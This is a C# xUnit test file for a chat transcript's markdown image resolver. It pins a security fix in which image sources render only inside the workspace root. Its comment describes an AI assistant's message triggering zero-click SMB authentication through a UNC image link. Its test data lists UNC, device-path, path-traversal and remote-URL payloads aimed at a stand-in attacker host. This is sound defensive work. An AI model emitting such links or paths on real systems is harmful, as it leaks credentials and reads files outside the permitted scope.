using System;
using System.IO;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using CodeWicket.UI.Markdown;
using Xunit;

namespace CodeWicket.Tests
{
    /// <summary>
    /// Which image sources the transcript will open (pre-release security review, September 2026).
    /// <para>
    /// The old rule was a scheme guard: refuse http(s), open everything else. A UNC path is not a
    /// scheme, so <c>![](\\attacker.example\s\p.png)</c> in an assistant message was handed to
    /// <c>FileInfo.Exists</c> on the dispatcher with no click - Windows authenticated to the host
    /// before "not found" came back, and the SMB timeout held devenv's UI thread while it did. The
    /// rule is now a containment: a file source renders only when its full path lies under the
    /// workspace root, and a caller with no root renders no file at all.
    /// </para>
    /// <para>
    /// <see cref="MarkdownImages.TryResolveLocalPath"/> is pure, so every spelling below is tested
    /// without a file system - which is also the property being pinned: a refused source is never
    /// stat'd. The two end-to-end cases then use REAL files on both sides of the root, so a null for
    /// the outside one is containment and not "the file was missing".
    /// </para>
    /// </summary>
    public sealed class MarkdownImageSourceTests
    {
        private const string Root = @"C:\ws\repo";

        [Theory]
        [InlineData(@"C:\ws\repo\img\x.png", @"C:\ws\repo\img\x.png")]
        [InlineData(@"C:\WS\Repo\img\x.png", @"C:\WS\Repo\img\x.png")]           // case-insensitive root
        [InlineData("file:///C:/ws/repo/img/x.png", @"C:\ws\repo\img\x.png")]     // a file: URI to a local drive
        [InlineData(@"C:\ws\repo\img\..\x.png", @"C:\ws\repo\x.png")]             // a .. that STAYS inside
        public void AFileUnderTheRootResolvesToItsFullPath(string url, string expected)
        {
            Assert.Equal(expected, MarkdownImages.TryResolveLocalPath(url, Root));
        }

        [Theory]
        [InlineData(@"\\attacker.example\share\x.png")]              // the finding's own spelling
        [InlineData("file://attacker.example/share/x.png")]          // LocalPath turns this into the UNC form
        [InlineData(@"\\?\UNC\attacker.example\share\x.png")]        // the extended-length UNC prefix
        [InlineData(@"\\.\pipe\x.png")]                              // a device path
        [InlineData(@"//attacker.example/share/x.png")]              // forward-slash UNC
        [InlineData(@"C:\ws\repo\..\..\Windows\x.png")]               // a .. that climbs out
        [InlineData("file:///C:/ws/repo/%2e%2e/%2e%2e/Windows/x.png")] // the same, percent-encoded
        [InlineData(@"C:\ws\repo2\x.png")]                            // a sibling sharing the root's spelling
        [InlineData(@"C:\ws\x.png")]                                  // the parent
        [InlineData(@"D:\ws\repo\x.png")]                             // the same tree on another drive
        [InlineData("img/x.png")]                                     // relative: ambiguous, never rooted here
        [InlineData("https://attacker.example/x.png")]                // remote scheme, as before
        [InlineData("http://attacker.example/x.png")]
        public void AnythingOutsideTheRootIsRefused(string url)
        {
            Assert.Null(MarkdownImages.TryResolveLocalPath(url, Root));
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        public void WithNoRootNoFileResolvesAtAll(string? root)
        {
            Assert.Null(MarkdownImages.TryResolveLocalPath(@"C:\ws\repo\img\x.png", root));
        }

        [Fact]
        public void TheRootsOwnSpellingDoesNotMatter()
        {
            Assert.Equal(@"C:\ws\repo\x.png", MarkdownImages.TryResolveLocalPath(@"C:\ws\repo\x.png", @"C:/ws/repo/"));
            Assert.Equal(@"C:\ws\repo\x.png", MarkdownImages.TryResolveLocalPath(@"C:\ws\repo\x.png", @"C:\ws\repo\"));
        }

        [Fact]
        public void AMalformedPathIsRefusedNotThrown()
        {
            Assert.Null(MarkdownImages.TryResolveLocalPath("C:\\ws\\repo\\x\0.png", Root));
        }

        // ---- end to end, with real files on both sides of the root -------------------------------

        [Fact]
        public void ARealFileRendersInsideTheRootAndNotOutsideIt()
        {
            StaTest.Run(() =>
            {
                var scratch = Path.Combine(Path.GetTempPath(), "cwkt-imgsrc-" + Guid.NewGuid().ToString("N"));
                var root = Path.Combine(scratch, "root");
                var outside = Path.Combine(scratch, "outside");
                Directory.CreateDirectory(root);
                Directory.CreateDirectory(outside);
                try
                {
                    var inside = Path.Combine(root, "x.png");
                    var beyond = Path.Combine(outside, "y.png");
                    WritePng(inside);
                    WritePng(beyond);
                    Assert.True(File.Exists(beyond)); // so the null below is containment, not absence

                    Assert.NotNull(MarkdownImages.TryCreateImage(inside, root));
                    Assert.NotNull(MarkdownImages.TryCreateImage(new Uri(inside).AbsoluteUri, root));
                    Assert.Null(MarkdownImages.TryCreateImage(beyond, root));
                    Assert.Null(MarkdownImages.TryCreateImage(inside, workspaceRoot: null));
                }
                finally
                {
                    try { Directory.Delete(scratch, recursive: true); } catch { /* best-effort */ }
                }
            });
        }

        [Fact]
        public void ADataUriNeedsNoRoot()
        {
            StaTest.Run(() =>
            {
                var png = Convert.ToBase64String(PngBytes());
                Assert.NotNull(MarkdownImages.TryCreateImage("data:image/png;base64," + png, workspaceRoot: null));
            });
        }

        private static void WritePng(string path) => File.WriteAllBytes(path, PngBytes());

        private static byte[] PngBytes()
        {
            var bitmap = new RenderTargetBitmap(2, 2, 96, 96, PixelFormats.Pbgra32);
            var encoder = new PngBitmapEncoder();
            encoder.Frames.Add(BitmapFrame.Create(bitmap));
            using var stream = new MemoryStream();
            encoder.Save(stream);
            return stream.ToArray();
        }
    }
}
